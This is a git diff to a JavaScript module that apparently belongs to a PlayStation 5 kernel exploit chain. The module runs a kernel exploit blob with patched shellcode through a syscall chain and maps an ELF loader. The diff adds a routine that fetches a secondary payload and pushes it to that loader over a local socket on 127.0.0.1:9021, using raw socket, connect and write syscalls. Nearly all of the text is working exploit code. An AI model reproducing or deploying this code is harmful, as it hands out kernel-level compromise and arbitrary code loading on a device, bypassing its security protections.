@@ -1,11 +1,13 @@
 import { int64 } from "./utils/int64.js";
 
+const AF_INET = 2, SOCK_STREAM = 1;
 const O_NONBLOCK = 0x4;
 const PROT_RW = 0x3, PROT_RWX = 0x7;
 const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
 
 const DEFAULT_KEXP = "kexp_2026_05_25.bin";
 const DEFAULT_ELFLDR = "elfldr-ps5-1360.elf";
+const SECONDARY_PAYLOAD = "pldmgr_v0.5.2.elf";
 
 const SHELLCODE = {
   size: 18912,
@@ -235,7 +237,70 @@ async function spawnAndJoin(entry, args, symbols, p, chain) {
   return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
 }
 
-export async function runKexp(krw, p, chain, log) {
+async function sendPayloadToElfldr(payloadName, p, chain, say) {
+  try {
+    say("fetching " + payloadName + "...");
+    const payloadBytes = await fetchBinary(payloadName);
+
+    const sockaddr = p.malloc(16, 1);
+    p.write2(sockaddr, 0x0210);
+    p.write2(sockaddr.add32(2), 0x3d23);
+    p.write1(sockaddr.add32(4), 127);
+    p.write1(sockaddr.add32(5), 0);
+    p.write1(sockaddr.add32(6), 0);
+    p.write1(sockaddr.add32(7), 1);
+    for (let i = 8; i < 16; i++) p.write1(sockaddr.add32(i), 0);
+
+    await new Promise((res) => setTimeout(res, 1000));
+
+    let fd = -1;
+    let connected = false;
+    for (let attempt = 0; attempt < 10; attempt++) {
+      const sockFdRes = await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0);
+      fd = sockFdRes.low | 0;
+      if (fd >= 0) {
+        const connRes = await chain.syscall(SYS_CONNECT, fd, sockaddr, 16);
+        if ((connRes.low | 0) === 0) {
+          connected = true;
+          break;
+        }
+        await chain.syscall(SYS_CLOSE, fd);
+      }
+      await new Promise((res) => setTimeout(res, 500));
+    }
+
+    if (!connected) {
+      say("failed to connect to elfldr on port 9021");
+      return false;
+    }
+
+    say("sending " + payloadName + " to elfldr...");
+    const chunkSize = 0x4000;
+    const buf = p.malloc(chunkSize, 1);
+    let offset = 0;
+
+    while (offset < payloadBytes.length) {
+      const currentChunk = Math.min(chunkSize, payloadBytes.length - offset);
+      for (let i = 0; i < currentChunk; i++) {
+        p.write1(buf.add32(i), payloadBytes[offset + i]);
+      }
+      const written = await chain.syscall(SYS_WRITE, fd, buf, currentChunk);
+      if ((written.low | 0) <= 0) {
+        throw new Error("kexp: socket write failed");
+      }
+      offset += written.low | 0;
+    }
+
+    await chain.syscall(SYS_CLOSE, fd);
+    say("sent " + payloadName + " successfully");
+    return true;
+  } catch (err) {
+    say("failed to send " + payloadName + ": " + ((err && err.message) || err));
+    return false;
+  }
+}
+
+export async function runKexp(krw, p, chain, log, elfName = DEFAULT_ELFLDR, secondaryPayload = SECONDARY_PAYLOAD) {
   const say = typeof log === "function" ? log : () => {};
   const allprocRva = window.KRW && window.KRW.allproc;
   if (!krw || !krw.ktextBase || !krw.procFdAddr)
@@ -248,7 +313,7 @@ export async function runKexp(krw, p, chain, log) {
     throw new Error("kexp: invalid allproc address " + hex(allproc));
   const symbols = resolveSymbols(p);
 
-  const elfldr = await mapElf(DEFAULT_ELFLDR, p, chain);
+  const elfldr = await mapElf(elfName, p, chain);
 
   const blob = await fetchBinary(DEFAULT_KEXP);
   patchShellcode(blob, symbols);
@@ -271,6 +336,11 @@ export async function runKexp(krw, p, chain, log) {
   const result = await spawnAndJoin(entry, args, symbols, p, chain);
   if (result.joinResult !== 0)
     throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
-  say("elfldr returned " + hex(result.shellcodeResult));
+  say(elfName + " returned " + hex(result.shellcodeResult));
+
+  if (secondaryPayload) {
+    await sendPayloadToElfldr(secondaryPayload, p, chain, say);
+  }
+
   return true;
 }
